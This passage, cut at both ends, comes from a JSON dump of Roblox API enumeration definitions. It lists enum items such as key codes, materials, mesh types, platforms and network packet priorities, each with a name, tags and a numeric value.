"type":"EnumItem","Name":"RightMeta","tags":[],"Value":309,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftAlt","tags":[],"Value":308,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightAlt","tags":[],"Value":307,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftControl","tags":[],"Value":306,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightControl","tags":[],"Value":305,"Enum":"KeyCode"},{"type":"EnumItem","Name":"CapsLock","tags":[],"Value":301,"Enum":"KeyCode"},{"type":"EnumItem","Name":"NumLock","tags":[],"Value":300,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ScrollLock","tags":[],"Value":302,"Enum":"KeyCode"},{"type":"EnumItem","Name":"LeftSuper","tags":[],"Value":311,"Enum":"KeyCode"},{"type":"EnumItem","Name":"RightSuper","tags":[],"Value":312,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Mode","tags":[],"Value":313,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Compose","tags":[],"Value":314,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Help","tags":[],"Value":315,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Print","tags":[],"Value":316,"Enum":"KeyCode"},{"type":"EnumItem","Name":"SysReq","tags":[],"Value":317,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Break","tags":[],"Value":318,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Menu","tags":[],"Value":319,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Power","tags":[],"Value":320,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Euro","tags":[],"Value":321,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Undo","tags":[],"Value":322,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F1","tags":[],"Value":282,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F2","tags":[],"Value":283,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F3","tags":[],"Value":284,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F4","tags":[],"Value":285,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F5","tags":[],"Value":286,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F6","tags":[],"Value":287,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F7","tags":[],"Value":288,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F8","tags":[],"Value":289,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F9","tags":[],"Value":290,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F10","tags":[],"Value":291,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F11","tags":[],"Value":292,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F12","tags":[],"Value":293,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F13","tags":[],"Value":294,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F14","tags":[],"Value":295,"Enum":"KeyCode"},{"type":"EnumItem","Name":"F15","tags":[],"Value":296,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World0","tags":[],"Value":160,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World1","tags":[],"Value":161,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World2","tags":[],"Value":162,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World3","tags":[],"Value":163,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World4","tags":[],"Value":164,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World5","tags":[],"Value":165,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World6","tags":[],"Value":166,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World7","tags":[],"Value":167,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World8","tags":[],"Value":168,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World9","tags":[],"Value":169,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World10","tags":[],"Value":170,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World11","tags":[],"Value":171,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World12","tags":[],"Value":172,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World13","tags":[],"Value":173,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World14","tags":[],"Value":174,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World15","tags":[],"Value":175,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World16","tags":[],"Value":176,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World17","tags":[],"Value":177,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World18","tags":[],"Value":178,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World19","tags":[],"Value":179,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World20","tags":[],"Value":180,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World21","tags":[],"Value":181,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World22","tags":[],"Value":182,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World23","tags":[],"Value":183,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World24","tags":[],"Value":184,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World25","tags":[],"Value":185,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World26","tags":[],"Value":186,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World27","tags":[],"Value":187,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World28","tags":[],"Value":188,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World29","tags":[],"Value":189,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World30","tags":[],"Value":190,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World31","tags":[],"Value":191,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World32","tags":[],"Value":192,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World33","tags":[],"Value":193,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World34","tags":[],"Value":194,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World35","tags":[],"Value":195,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World36","tags":[],"Value":196,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World37","tags":[],"Value":197,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World38","tags":[],"Value":198,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World39","tags":[],"Value":199,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World40","tags":[],"Value":200,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World41","tags":[],"Value":201,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World42","tags":[],"Value":202,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World43","tags":[],"Value":203,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World44","tags":[],"Value":204,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World45","tags":[],"Value":205,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World46","tags":[],"Value":206,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World47","tags":[],"Value":207,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World48","tags":[],"Value":208,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World49","tags":[],"Value":209,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World50","tags":[],"Value":210,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World51","tags":[],"Value":211,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World52","tags":[],"Value":212,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World53","tags":[],"Value":213,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World54","tags":[],"Value":214,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World55","tags":[],"Value":215,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World56","tags":[],"Value":216,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World57","tags":[],"Value":217,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World58","tags":[],"Value":218,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World59","tags":[],"Value":219,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World60","tags":[],"Value":220,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World61","tags":[],"Value":221,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World62","tags":[],"Value":222,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World63","tags":[],"Value":223,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World64","tags":[],"Value":224,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World65","tags":[],"Value":225,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World66","tags":[],"Value":226,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World67","tags":[],"Value":227,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World68","tags":[],"Value":228,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World69","tags":[],"Value":229,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World70","tags":[],"Value":230,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World71","tags":[],"Value":231,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World72","tags":[],"Value":232,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World73","tags":[],"Value":233,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World74","tags":[],"Value":234,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World75","tags":[],"Value":235,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World76","tags":[],"Value":236,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World77","tags":[],"Value":237,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World78","tags":[],"Value":238,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World79","tags":[],"Value":239,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World80","tags":[],"Value":240,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World81","tags":[],"Value":241,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World82","tags":[],"Value":242,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World83","tags":[],"Value":243,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World84","tags":[],"Value":244,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World85","tags":[],"Value":245,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World86","tags":[],"Value":246,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World87","tags":[],"Value":247,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World88","tags":[],"Value":248,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World89","tags":[],"Value":249,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World90","tags":[],"Value":250,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World91","tags":[],"Value":251,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World92","tags":[],"Value":252,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World93","tags":[],"Value":253,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World94","tags":[],"Value":254,"Enum":"KeyCode"},{"type":"EnumItem","Name":"World95","tags":[],"Value":255,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonX","tags":[],"Value":1000,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonY","tags":[],"Value":1001,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonA","tags":[],"Value":1002,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonB","tags":[],"Value":1003,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR1","tags":[],"Value":1004,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL1","tags":[],"Value":1005,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR2","tags":[],"Value":1006,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL2","tags":[],"Value":1007,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonR3","tags":[],"Value":1008,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonL3","tags":[],"Value":1009,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonStart","tags":[],"Value":1010,"Enum":"KeyCode"},{"type":"EnumItem","Name":"ButtonSelect","tags":[],"Value":1011,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadLeft","tags":[],"Value":1012,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadRight","tags":[],"Value":1013,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadUp","tags":[],"Value":1014,"Enum":"KeyCode"},{"type":"EnumItem","Name":"DPadDown","tags":[],"Value":1015,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Thumbstick1","tags":[],"Value":1016,"Enum":"KeyCode"},{"type":"EnumItem","Name":"Thumbstick2","tags":[],"Value":1017,"Enum":"KeyCode"},{"type":"Enum","Name":"KeywordFilterType","tags":[]},{"type":"EnumItem","Name":"include","tags":[],"Value":0,"Enum":"KeywordFilterType"},{"type":"EnumItem","Name":"Exclude","tags":[],"Value":1,"Enum":"KeywordFilterType"},{"type":"Enum","Name":"LeftRight","tags":[]},{"type":"EnumItem","Name":"Left","tags":[],"Value":0,"Enum":"LeftRight"},{"type":"EnumItem","Name":"Center","tags":[],"Value":1,"Enum":"LeftRight"},{"type":"EnumItem","Name":"Right","tags":[],"Value":2,"Enum":"LeftRight"},{"type":"Enum","Name":"LevelOfDetailSetting","tags":[]},{"type":"EnumItem","Name":"High","tags":[],"Value":2,"Enum":"LevelOfDetailSetting"},{"type":"EnumItem","Name":"Medium","tags":[],"Value":1,"Enum":"LevelOfDetailSetting"},{"type":"EnumItem","Name":"Low","tags":[],"Value":0,"Enum":"LevelOfDetailSetting"},{"type":"Enum","Name":"ListenerType","tags":[]},{"type":"EnumItem","Name":"Camera","tags":[],"Value":0,"Enum":"ListenerType"},{"type":"EnumItem","Name":"CFrame","tags":[],"Value":1,"Enum":"ListenerType"},{"type":"EnumItem","Name":"ObjectPosition","tags":[],"Value":2,"Enum":"ListenerType"},{"type":"EnumItem","Name":"ObjectCFrame","tags":[],"Value":3,"Enum":"ListenerType"},{"type":"Enum","Name":"Material","tags":[]},{"type":"EnumItem","Name":"Plastic","tags":[],"Value":256,"Enum":"Material"},{"type":"EnumItem","Name":"Wood","tags":[],"Value":512,"Enum":"Material"},{"type":"EnumItem","Name":"Slate","tags":[],"Value":800,"Enum":"Material"},{"type":"EnumItem","Name":"Concrete","tags":[],"Value":816,"Enum":"Material"},{"type":"EnumItem","Name":"CorrodedMetal","tags":[],"Value":1040,"Enum":"Material"},{"type":"EnumItem","Name":"DiamondPlate","tags":[],"Value":1056,"Enum":"Material"},{"type":"EnumItem","Name":"Foil","tags":[],"Value":1072,"Enum":"Material"},{"type":"EnumItem","Name":"Grass","tags":[],"Value":1280,"Enum":"Material"},{"type":"EnumItem","Name":"Ice","tags":[],"Value":1536,"Enum":"Material"},{"type":"EnumItem","Name":"Marble","tags":[],"Value":784,"Enum":"Material"},{"type":"EnumItem","Name":"Granite","tags":[],"Value":832,"Enum":"Material"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":848,"Enum":"Material"},{"type":"EnumItem","Name":"Pebble","tags":[],"Value":864,"Enum":"Material"},{"type":"EnumItem","Name":"Sand","tags":[],"Value":1296,"Enum":"Material"},{"type":"EnumItem","Name":"Fabric","tags":[],"Value":1312,"Enum":"Material"},{"type":"EnumItem","Name":"SmoothPlastic","tags":[],"Value":272,"Enum":"Material"},{"type":"EnumItem","Name":"Metal","tags":[],"Value":1088,"Enum":"Material"},{"type":"EnumItem","Name":"WoodPlanks","tags":[],"Value":528,"Enum":"Material"},{"type":"EnumItem","Name":"Cobblestone","tags":[],"Value":880,"Enum":"Material"},{"type":"EnumItem","Name":"Air","tags":["notbrowsable"],"Value":1792,"Enum":"Material"},{"type":"EnumItem","Name":"Water","tags":["notbrowsable"],"Value":2048,"Enum":"Material"},{"type":"EnumItem","Name":"Rock","tags":["notbrowsable"],"Value":896,"Enum":"Material"},{"type":"EnumItem","Name":"Glacier","tags":["notbrowsable"],"Value":1552,"Enum":"Material"},{"type":"EnumItem","Name":"Snow","tags":["notbrowsable"],"Value":1328,"Enum":"Material"},{"type":"EnumItem","Name":"Sandstone","tags":["notbrowsable"],"Value":912,"Enum":"Material"},{"type":"EnumItem","Name":"Mud","tags":["notbrowsable"],"Value":1344,"Enum":"Material"},{"type":"EnumItem","Name":"Basalt","tags":["notbrowsable"],"Value":788,"Enum":"Material"},{"type":"EnumItem","Name":"Ground","tags":["notbrowsable"],"Value":1360,"Enum":"Material"},{"type":"EnumItem","Name":"CrackedLava","tags":["notbrowsable"],"Value":804,"Enum":"Material"},{"type":"EnumItem","Name":"Neon","tags":[],"Value":288,"Enum":"Material"},{"type":"EnumItem","Name":"Asphalt","tags":["notbrowsable"],"Value":1376,"Enum":"Material"},{"type":"EnumItem","Name":"LeafyGrass","tags":["notbrowsable"],"Value":1284,"Enum":"Material"},{"type":"EnumItem","Name":"Salt","tags":["notbrowsable"],"Value":1392,"Enum":"Material"},{"type":"EnumItem","Name":"Limestone","tags":["notbrowsable"],"Value":820,"Enum":"Material"},{"type":"EnumItem","Name":"Pavement","tags":["notbrowsable"],"Value":836,"Enum":"Material"},{"type":"Enum","Name":"MembershipType","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"MembershipType"},{"type":"EnumItem","Name":"BuildersClub","tags":[],"Value":1,"Enum":"MembershipType"},{"type":"EnumItem","Name":"TurboBuildersClub","tags":[],"Value":2,"Enum":"MembershipType"},{"type":"EnumItem","Name":"OutrageousBuildersClub","tags":[],"Value":3,"Enum":"MembershipType"},{"type":"Enum","Name":"MeshType","tags":[]},{"type":"EnumItem","Name":"Head","tags":[],"Value":0,"Enum":"MeshType"},{"type":"EnumItem","Name":"Torso","tags":[],"Value":1,"Enum":"MeshType"},{"type":"EnumItem","Name":"Wedge","tags":[],"Value":2,"Enum":"MeshType"},{"type":"EnumItem","Name":"Prism","tags":["deprecated"],"Value":7,"Enum":"MeshType"},{"type":"EnumItem","Name":"Pyramid","tags":["deprecated"],"Value":8,"Enum":"MeshType"},{"type":"EnumItem","Name":"ParallelRamp","tags":["deprecated"],"Value":9,"Enum":"MeshType"},{"type":"EnumItem","Name":"RightAngleRamp","tags":["deprecated"],"Value":10,"Enum":"MeshType"},{"type":"EnumItem","Name":"CornerWedge","tags":["deprecated"],"Value":11,"Enum":"MeshType"},{"type":"EnumItem","Name":"Brick","tags":[],"Value":6,"Enum":"MeshType"},{"type":"EnumItem","Name":"Sphere","tags":[],"Value":3,"Enum":"MeshType"},{"type":"EnumItem","Name":"Cylinder","tags":[],"Value":4,"Enum":"MeshType"},{"type":"EnumItem","Name":"FileMesh","tags":[],"Value":5,"Enum":"MeshType"},{"type":"Enum","Name":"MessageType","tags":[]},{"type":"EnumItem","Name":"MessageOutput","tags":[],"Value":0,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageInfo","tags":[],"Value":1,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageWarning","tags":[],"Value":2,"Enum":"MessageType"},{"type":"EnumItem","Name":"MessageError","tags":[],"Value":3,"Enum":"MessageType"},{"type":"Enum","Name":"MouseBehavior","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":0,"Enum":"MouseBehavior"},{"type":"EnumItem","Name":"LockCenter","tags":[],"Value":1,"Enum":"MouseBehavior"},{"type":"EnumItem","Name":"LockCurrentPosition","tags":[],"Value":2,"Enum":"MouseBehavior"},{"type":"Enum","Name":"MoveState","tags":[]},{"type":"EnumItem","Name":"Stopped","tags":[],"Value":0,"Enum":"MoveState"},{"type":"EnumItem","Name":"Coasting","tags":[],"Value":1,"Enum":"MoveState"},{"type":"EnumItem","Name":"Pushing","tags":[],"Value":2,"Enum":"MoveState"},{"type":"EnumItem","Name":"Stopping","tags":[],"Value":3,"Enum":"MoveState"},{"type":"EnumItem","Name":"AirFree","tags":[],"Value":4,"Enum":"MoveState"},{"type":"Enum","Name":"NameOcclusion","tags":[]},{"type":"EnumItem","Name":"OccludeAll","tags":[],"Value":2,"Enum":"NameOcclusion"},{"type":"EnumItem","Name":"EnemyOcclusion","tags":[],"Value":1,"Enum":"NameOcclusion"},{"type":"EnumItem","Name":"NoOcclusion","tags":[],"Value":0,"Enum":"NameOcclusion"},{"type":"Enum","Name":"NetworkOwnership","tags":[]},{"type":"EnumItem","Name":"Automatic","tags":[],"Value":0,"Enum":"NetworkOwnership"},{"type":"EnumItem","Name":"Manual","tags":[],"Value":1,"Enum":"NetworkOwnership"},{"type":"Enum","Name":"NormalId","tags":[]},{"type":"EnumItem","Name":"Top","tags":[],"Value":1,"Enum":"NormalId"},{"type":"EnumItem","Name":"Bottom","tags":[],"Value":4,"Enum":"NormalId"},{"type":"EnumItem","Name":"Back","tags":[],"Value":2,"Enum":"NormalId"},{"type":"EnumItem","Name":"Front","tags":[],"Value":5,"Enum":"NormalId"},{"type":"EnumItem","Name":"Right","tags":[],"Value":0,"Enum":"NormalId"},{"type":"EnumItem","Name":"Left","tags":[],"Value":3,"Enum":"NormalId"},{"type":"Enum","Name":"OverrideMouseIconBehavior","tags":[]},{"type":"EnumItem","Name":"None","tags":[],"Value":0,"Enum":"OverrideMouseIconBehavior"},{"type":"EnumItem","Name":"ForceShow","tags":[],"Value":1,"Enum":"OverrideMouseIconBehavior"},{"type":"EnumItem","Name":"ForceHide","tags":[],"Value":2,"Enum":"OverrideMouseIconBehavior"},{"type":"Enum","Name":"PacketPriority","tags":[]},{"type":"EnumItem","Name":"IMMEDIATE_PRIORITY","tags":[],"Value":0,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"HIGH_PRIORITY","tags":[],"Value":1,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"MEDIUM_PRIORITY","tags":[],"Value":2,"Enum":"PacketPriority"},{"type":"EnumItem","Name":"LOW_PRIORITY","tags":[],"Value":3,"Enum":"PacketPriority"},{"type":"Enum","Name":"PacketReliability","tags":[]},{"type":"EnumItem","Name":"UNRELIABLE","tags":[],"Value":0,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"UNRELIABLE_SEQUENCED","tags":[],"Value":1,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE","tags":[],"Value":2,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE_ORDERED","tags":[],"Value":3,"Enum":"PacketReliability"},{"type":"EnumItem","Name":"RELIABLE_SEQUENCED","tags":[],"Value":4,"Enum":"PacketReliability"},{"type":"Enum","Name":"PartType","tags":[]},{"type":"EnumItem","Name":"Ball","tags":[],"Value":0,"Enum":"PartType"},{"type":"EnumItem","Name":"Block","tags":[],"Value":1,"Enum":"PartType"},{"type":"EnumItem","Name":"Cylinder","tags":[],"Value":2,"Enum":"PartType"},{"type":"Enum","Name":"PathStatus","tags":[]},{"type":"EnumItem","Name":"Success","tags":[],"Value":0,"Enum":"PathStatus"},{"type":"EnumItem","Name":"ClosestNoPath","tags":[],"Value":1,"Enum":"PathStatus"},{"type":"EnumItem","Name":"ClosestOutOfRange","tags":[],"Value":2,"Enum":"PathStatus"},{"type":"EnumItem","Name":"FailStartNotEmpty","tags":[],"Value":3,"Enum":"PathStatus"},{"type":"EnumItem","Name":"FailFinishNotEmpty","tags":[],"Value":4,"Enum":"PathStatus"},{"type":"Enum","Name":"PhysicalPropertiesMode","tags":[]},{"type":"EnumItem","Name":"Default","tags":[],"Value":1,"Enum":"PhysicalPropertiesMode"},{"type":"EnumItem","Name":"Legacy","tags":[],"Value":0,"Enum":"PhysicalPropertiesMode"},{"type":"EnumItem","Name":"New","tags":[],"Value":2,"Enum":"PhysicalPropertiesMode"},{"type":"Enum","Name":"PhysicsReceiveMethod","tags":[]},{"type":"EnumItem","Name":"Direct","tags":[],"Value":0,"Enum":"PhysicsReceiveMethod"},{"type":"EnumItem","Name":"Interpolation","tags":[],"Value":1,"Enum":"PhysicsReceiveMethod"},{"type":"Enum","Name":"PhysicsSendMethod","tags":[]},{"type":"EnumItem","Name":"ErrorComputation","tags":[],"Value":0,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"ErrorComputation2","tags":[],"Value":1,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"RoundRobin","tags":[],"Value":2,"Enum":"PhysicsSendMethod"},{"type":"EnumItem","Name":"TopNErrors","tags":[],"Value":3,"Enum":"PhysicsSendMethod"},{"type":"Enum","Name":"Platform","tags":[]},{"type":"EnumItem","Name":"Windows","tags":[],"Value":0,"Enum":"Platform"},{"type":"EnumItem","Name":"OSX","tags":[],"Value":1,"Enum":"Platform"},{"type":"EnumItem","Name":"IOS","tags":[],"Value":2,"Enum":"Platform"},{"type":"EnumItem","Name":"Android","tags":[],"Value":3,"Enum":"Platform"},{"type":"EnumItem","Name":"XBoxOne","tags":[],"Value":4,"Enum":"Platform"},{"type":"EnumItem","Name":"PS4","tags":[],"Value":5,"Enum":"Platform"},{"type":"EnumItem","Name":"PS3","tags":[],"Value":6,"Enum":"Platform"},{"type":"EnumItem","Name":"XBox360","tags":[],"Value":7,"Enum":"Platform"},{"type":"EnumItem","Name":"WiiU","tags":[],"Value":8,"Enum":"Platform"},{"type":"EnumItem","Name":"NX","tags":[],"Value":9,"Enum":"Platform"},{"type":"EnumItem","Name":"Ouya","tags":[],"Value":10,"Enum":"Platform"},{"type":"EnumItem","Name":"AndroidTV","tags":[],"Value":11,"Enum":"Platform"},{"type":"EnumItem","Name":"Chromecast","tags":[],"Value":12,"Enum":"Platform"},{"type":"EnumItem","Name":"Linux","tags":[],"Value":13,"Enum":"Platform"},{"type":"EnumItem","Name":"SteamOS","tags":[],"Value":14,"Enum":"Platform"},{"type":"EnumItem","Name":"WebOS","tags":[],"Value":15,"Enum":"Platform"},{"type":"EnumItem","Name":"DOS","tags":[],"Value":16,"Enum":"Platform"},{"type":"EnumItem","Name":"BeOS","tags":[],"Value":17,"Enum":"Platform"},{"type":"EnumItem","Name":"UWP","tags":[],"Value":18,"Enum":"Platform"},{"type":"EnumItem","Name":"None","tags":[],"Value":19,"Enum":"Platform"},{"type":"Enum","Name":"PlayerActions","tags":[]},{"type":"EnumItem","Name":"CharacterForward","tags":[],"Value":0,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterBackward","tags":[],"Value":1,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterLeft","tags":[],"Value":2,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterRight","tags":[],"Value":3,"Enum":"PlayerActions"},{"type":"EnumItem","Name":"CharacterJump","tags":[],"Value":4,"Enum":"PlayerActions"},{"type":"Enum","Name":"PlayerChatType","tags":[]},{"type":"EnumItem","Name":"All","tags":[],"Value":0,"Enum":"PlayerChatType"},{"type":"EnumItem","Name":"Team","tags":[],"Value":1,"Enum":"PlayerChatType"},{"type":"EnumItem","Name":"Whisper","tags":[],"Value":2,"Enum":"PlayerChatType"},{"type":"Enum","Name":"PoseEasingDirection","tags":[]},{"type":"EnumItem","Name":"Out","tags":[],"Value":1,"Enum":"PoseEasingDirection"},{"type":"EnumItem","Name":"InOut","tags":[],"Value":2,"Enum":"PoseEasingDirection"},{"type":"EnumItem","Name":"In","tags":[],"Value":0,"Enum":"PoseEasingDirection"},{"type":"Enum","Name":"PoseEasingStyle","tags":[]},{"type":"EnumItem","Name":"Linear","tags":[],"Value":0,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Constant","tags":[],"Value":1,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Elastic","tags":[],"Value":2,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Cubic","tags":[],"Value":3,"Enum":"PoseEasingStyle"},{"type":"EnumItem","Name":"Bounce","tags":[],"Value":4,"Enum":"PoseEasingStyle"},{"type":"Enum","Name":"PriorityMethod","tags":[]},{"type":"EnumItem","Name":"LastError","tags":[],"Value":0,"Enum":"PriorityMethod"},{"type":"EnumItem","Name":"AccumulatedError","tags":[],"Value":1,"Enum":"PriorityMethod"},{"type":"EnumItem","Name":"FIFO","tags":[],"Value":2,"Enum":"PriorityMethod"},{"type":"Enum","Name":"PrismSides","tags":[]},{"type":"EnumItem","Name":"3","tags":[],"Value":3,"Enum":"PrismSides"},{"type":"EnumItem","Name":"5","tags":[],"Value":5,"Enum":"PrismSides"},{"type":"EnumItem","Name":"6","tags":[],"Value":6,"Enum":"PrismSides"},{"type":"EnumItem","Name":"8","tags":[],"Value":8,"Enum":"PrismSides"},{"type":"EnumItem","Name":"10","tags":[],"Value":10,"Enum":"PrismSides"},{"type":"EnumItem","Name":"20","tags":[],"Value":20,"Enum":"PrismSides"},{"type":"Enum","Name":"PrivilegeType","tags":[]},{"type":"EnumItem","Name":"Owner","tags":[],"Value":255,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Admin","tags":[],"Value":240,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Member","tags":[],"Value":128,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Visitor","tags":[],"Value":10,"Enum":"PrivilegeType"},{"type":"EnumItem","Name":"Banned","tags":[],"Value":0,"Enum":"PrivilegeType"},{"type":"Enum","Name":"ProductPurchaseDecision","tags":[]},{"type":"EnumItem","Name":"NotProcessedYet","tags":[],"Value":0,"Enum":"ProductPurchaseDecision"},{"type":"EnumItem","Name":"PurchaseGranted","tags":[],"Value":1,"Enum":"ProductPurchaseDecision"},{"type":"Enum","Name":"PyramidSides","tags":[]},{"type":"EnumItem","Name":"3","tags":[],"Value":3,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"4","tags":[],"Value":4,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"5","tags":[],"Value":5,"Enum":"PyramidSides"},{"type":"EnumItem","Name":"6","tags":[],"Value":6,"Enum":"PyramidSides"},{"type":"EnumItem"